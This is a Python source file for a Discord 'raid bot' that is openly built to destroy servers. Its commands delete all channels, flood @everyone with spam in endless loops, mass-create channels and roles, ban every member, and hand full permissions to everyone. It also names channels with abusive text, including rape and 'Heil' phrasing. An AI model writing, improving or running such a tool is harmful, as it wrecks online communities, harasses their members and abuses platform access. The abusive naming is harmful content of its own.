import discord, os, colorama, asyncio, random, json
from discord.ext import commands
from discord import Permissions

token = os.environ['token']

kichi = commands.Bot(command_prefix="x!", intents = discord.Intents.all())


    


yoromo = input("Guild ID: ")

  


channel_names = "praise tinkgy"

channel_names2 = "Heil rmr"

channel_names3 = "raped by rmr"

messege_spam = "@everyone Nuked By RmR Stay Safe My fellow Freinds https://media.discordapp.net/attachments/1128776132402094163/1129425411659530300/2023-06-15_1688614963804.mp4"

status = "/help"

@kichi.event
async def on_connect():
  print(f''''
Connected To {kichi.user.name}  
User Id: {kichi.user.id}''')
  await kichi.change_presence(
    activity=discord.Streaming(name=status, url="https://www.twitch.tv/cp"))
     

@kichi.event
async def on_ready():
    print(""""
██╗░░██╗██╗░█████╗░██╗░░██╗██╗
██║░██╔╝██║██╔══██╗██║░░██║██║
█████═╝░██║██║░░╚═╝███████║██║
██╔═██╗░██║██║░░██╗██╔══██║██║
██║░╚██╗██║╚█████╔╝██║░░██║██║
╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝╚═╝

██████╗░░█████╗░██╗██████╗░███████╗██████╗░
██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔══██╗
██████╔╝███████║██║██║░░██║█████╗░░██████╔╝
██╔══██╗██╔══██║██║██║░░██║██╔══╝░░██╔══██╗
██║░░██║██║░░██║██║██████╔╝███████╗██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝   
___________________________________________________________
|___________________________________________________________|
Welcome To Kichi Raid Bot, this was made by   Tinkgy Do not skid our work

Press Any Button To Continue ☆""")

@kichi.command()
async def spam(ctx):
  while True:
    await ctx.send("@everyone raided by :*RMR*: Surrender") #spams infinite amount of messeges

@kichi.command()
async def purge(ctx):
  for i in range(50):
    await ctx.send("@everyone raided by :*RMR*: Surrender")
  



@kichi.command()
async def channeldelete(ctx):
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
    except:
       pass

@kichi.command()
async def spamchannels(ctx):
  while True:
    await ctx.guild.create_text_channel("joinggragingmonsters") #it spams channels but also raids
    
@kichi.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):

      await ctx.guild.create_role(name=f"Nuked By 𝑹𝑴𝑹 AND NA // Heil Tinkgy Praise")
      




@kichi.command()
async def nuke(ctx):
  await ctx.guild.edit(name="Nuked By 𝑹𝑴𝑹 AND NA // Heil Tinkgy Praise")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
    except:
       pass
  while True:
                              await ctx.guild.create_text_channel(channel_names)
                               
                              await ctx.guild.create_text_channel(channel_names2)                           
                              await ctx.guild.create_text_channel(channel_names3)
                                            
   

@kichi.event
async def on_guild_channel_create(channel):
     await channel.send(messege_spam)
  

    

@kichi.command()
async def massban(ctx):
  for member in ctx.guild.members:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
       except:
        pass #bans everyone within 10 seconds or higher


@kichi.command(pass_context=True)
async def perms(ctx):
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                                          await role.edit(permissions=Permissions.all())
                  except:
                    pass #gives all users perms



kichi.run(token)